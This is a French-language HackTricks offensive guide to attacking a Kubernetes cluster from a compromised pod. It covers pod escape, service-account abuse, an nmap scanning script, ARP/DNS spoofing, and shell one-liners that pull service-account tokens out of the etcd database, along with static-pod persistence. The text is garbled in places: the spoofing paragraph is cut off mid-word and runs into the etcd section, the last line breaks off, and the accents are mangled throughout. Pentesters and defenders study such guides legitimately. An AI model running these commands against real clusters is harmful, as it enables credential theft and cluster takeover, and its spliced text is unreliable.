# Attaquer Kubernetes depuis l'int√©rieur d'un Pod

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous voulez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **√âvasion de Pod**

**Si vous avez de la chance, vous pourrez peut-√™tre vous √©chapper vers le n≈ìud :**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### √âvasion du pod

Pour essayer de s'√©chapper du pod, vous devrez peut-√™tre **escalader les privil√®ges** en premier lieu, certaines techniques pour le faire :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Vous pouvez v√©rifier ces **√©vasions de docker pour essayer de vous √©chapper** d'un pod que vous avez compromis :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abus de privil√®ges Kubernetes

Comme expliqu√© dans la section sur **l'√©num√©ration de Kubernetes** :

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

G√©n√©ralement, les pods sont ex√©cut√©s avec un **jeton de compte de service** √† l'int√©rieur d'eux. Ce compte de service peut avoir des **privil√®ges attach√©s** que vous pourriez **abuser** pour **passer** √† d'autres pods ou m√™me pour **s'√©chapper** vers les n≈ìuds configur√©s √† l'int√©rieur du cluster. V√©rifiez comment dans :

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abus de privil√®ges Cloud

Si le pod est ex√©cut√© √† l'int√©rieur d'un **environnement cloud**, vous pourriez √™tre en mesure de **fuir un jeton depuis le point de terminaison de m√©tadonn√©es** et d'escalader les privil√®ges en l'utilisant.

## Recherche de services r√©seau vuln√©rables

Comme vous √™tes √† l'int√©rieur de l'environnement Kubernetes, si vous ne pouvez pas escalader les privil√®ges en abusant des privil√®ges actuels des pods et que vous ne pouvez pas vous √©chapper du conteneur, vous devriez **rechercher des services potentiellement vuln√©rables.**

### Services

**√Ä cette fin, vous pouvez essayer d'obtenir tous les services de l'environnement Kubernetes :**

```
kubectl get svc --all-namespaces
```

Par d√©faut, Kubernetes utilise un sch√©ma de mise en r√©seau plat, ce qui signifie que **tout pod/service √† l'int√©rieur du cluster peut communiquer avec les autres**. Les **espaces de noms** √† l'int√©rieur du cluster **n'ont pas de restrictions de s√©curit√© r√©seau par d√©faut**. Tout le monde dans l'espace de noms peut communiquer avec d'autres espaces de noms.

### Balayage

Le script Bash suivant (pris dans un [atelier Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)) installera et analysera les plages d'adresses IP du cluster Kubernetes :

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube () 
{ 
    nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
    local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
    local SERVER_RANGES=" ";
    SERVER_RANGES+="10.0.0.1 ";
    SERVER_RANGES+="10.0.1.* ";
    SERVER_RANGES+="10.*.0-1.* ";
    nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Consultez la page suivante pour apprendre comment vous pourriez **attaquer des services sp√©cifiques √† Kubernetes** pour **compromettre d'autres pods/tout l'environnement** :

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Sniffing

Dans le cas o√π le **pod compromis ex√©cute un service sensible** o√π d'autres pods doivent s'authentifier, vous pourriez √™tre en mesure d'obtenir les informations d'identification envoy√©es par les autres pods en **sniffant les communications locales**.

## Spoofing de r√©seau

Par d√©faut, des techniques telles que le **spoofing ARP** (et gr√¢ce √† cela, le **spoofing DNS**) fonctionnent dans le r√©seau Kubernetes. Ensuite, √† l'int√©rieur d'un pod, si vous avez la **capacit√© NET\_RAW** (qui est l√† par d√©faut), vous pourrez envoyer des paquets r√©seau personnalis√©s et effectuer des **attaques MitM via le spoof
### Vol de etcd

Si vous pouvez sp√©cifier le [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) du noeud qui ex√©cutera le conteneur, obtenez un shell √† l'int√©rieur d'un n≈ìud de plan de contr√¥le et obtenez la base de donn√©es **etcd** :

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

Les n≈ìuds de plan de contr√¥le ont le **r√¥le de ma√Ætre** et dans les **clusters g√©r√©s dans le cloud, vous ne pourrez rien ex√©cuter dedans**.

#### Lire les secrets d'etcd

Si vous pouvez ex√©cuter votre pod sur un n≈ìud de plan de contr√¥le en utilisant le s√©lecteur `nodeName` dans la sp√©cification du pod, vous pourriez avoir un acc√®s facile √† la base de donn√©es `etcd`, qui contient toute la configuration du cluster, y compris tous les secrets.

Voici une m√©thode rapide et sale pour r√©cup√©rer des secrets d'`etcd` s'il est en cours d'ex√©cution sur le n≈ìud de plan de contr√¥le sur lequel vous vous trouvez. Si vous voulez une solution plus √©l√©gante qui lance un pod avec l'utilitaire client `etcdctl` et utilise les informations d'identification du n≈ìud de plan de contr√¥le pour se connecter √† etcd o√π qu'il soit en cours d'ex√©cution, consultez [cet exemple de manifeste](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**V√©rifiez si `etcd` est en cours d'ex√©cution sur le n≈ìud de plan de contr√¥le et voyez o√π se trouve la base de donn√©es (Ceci est sur un cluster cr√©√© avec `kubeadm`)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

Sortie :

```bash
data-dir=/var/lib/etcd
```

**Afficher les donn√©es dans la base de donn√©es etcd :**

```bash
strings /var/lib/etcd/member/snap/db | less
```

**Extraire les jetons de la base de donn√©es et afficher le nom du compte de service**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**M√™me commande, mais avec quelques greps pour ne retourner que le jeton par d√©faut dans l'espace de noms kube-system**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

Sortie :

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

### Persistance des pods statiques/miroirs

Les _pods statiques_ sont g√©r√©s directement par le d√©mon kubelet sur un n≈ìud sp√©cifique, sans que le serveur API ne les observe. Contrairement aux pods g√©r√©s par le plan de contr√¥le (par exemple, un d√©ploiement); √† la place, le **kubelet surveille chaque pod statique** (et le red√©marre s'il √©choue).

Par cons√©quent, les pods statiques sont toujours **li√©s √† un seul kubelet** sur un n≈ìud sp√©cifique.

Le **kubelet essaie automatiquement de cr√©er un pod miroir sur le serveur API Kubernetes** pour chaque pod statique. Cela signifie que les pods en cours d'ex√©cution sur un n≈ìud sont visibles sur le serveur API, mais ne peuvent pas √™tre contr√¥l√©s √† partir de l√†. Les noms de pod seront suffix√©s avec le nom d'h√¥te du n≈ìud avec un tiret en t√™te.

{% hint style="danger" %}
Le **`spec` d'un pod statique ne peut pas faire r√©f√©rence √† d'autres objets API** (par exemple, ServiceAccount, ConfigMap, Secret, etc. Vous ne pouvez donc pas abuser de ce comportement pour lancer un pod avec un serviceAccount arbitraire dans le n≈ìud actuel pour compromettre le cluster. Mais vous pourriez utiliser cela pour ex√©cuter des pods dans diff√©rents espaces de noms (au cas o√π cela serait utile pour une raison quelconque).
{% endhint %}

Si vous √™tes √† l'int√©rieur de l'h√¥te du n≈ìud, vous pouvez le faire cr√©er un **pod statique √† l'int√©rieur de lui-m√™me**. C'est assez utile car cela pourrait vous permettre de **cr√©er un pod dans un espace de noms diff√©rent** comme **kube-system**.

Pour cr√©er un pod statique, la [**documentation est d'une grande aide**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Vous avez essentiellement besoin de 2 choses :

* Configurez le param√®tre **`--pod-manifest-path=/etc/kubernetes/manifests`** dans le **service kubelet**, ou dans la **configuration kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration